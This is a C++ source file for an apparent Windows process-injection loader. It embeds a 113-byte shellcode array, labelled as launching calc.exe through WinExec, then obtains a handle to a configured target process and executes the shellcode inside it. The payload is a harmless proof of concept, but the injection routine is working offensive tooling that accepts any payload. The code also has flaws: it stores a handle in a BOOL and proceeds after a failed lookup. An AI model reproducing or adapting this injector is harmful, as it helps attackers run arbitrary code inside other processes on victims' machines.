#include "config.hpp"
#include "typedef.hpp"
#include "execute.hpp"
#include "enumerate.hpp"

#ifndef _DEBUG
#pragma comment(linker, "/ENTRY:entry")
#endif

VOID entry(void)
{
	unsigned char shellcode[113] = {
		0x31,0xc0,0x50,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x50,0x40,0x92,0x74,0x15,
		0x51,0x64,0x8b,0x72,0x2f,0x8b,0x76,0x0c,0x8b,0x76,0x0c,0xad,0x8b,0x30,0x8b,
		0x7e,0x18,0xb2,0x50,0xeb,0x1a,0xb2,0x60,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,
		0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,
		0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,
		0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,
		0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,
		0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7
	}; // win-exec-calc-shellcode.bin

	BOOL result = FALSE;
	BOOL process_handle = NULL;

	process_handle = enumerate::GetProcessHandle((LPCWSTR)CONFIG_EXECUTION_TARGET_NAME, 0, 0);
	if (!process_handle)
	{
		LOG_ERROR("Error getting process handle.");
		result = FALSE;
	}

	ExecuteShellcode((HANDLE)process_handle, shellcode);
	result = TRUE;
}

#pragma region [alternate entrypoints]

int main(void) { entry(); return 0; }

#pragma endregion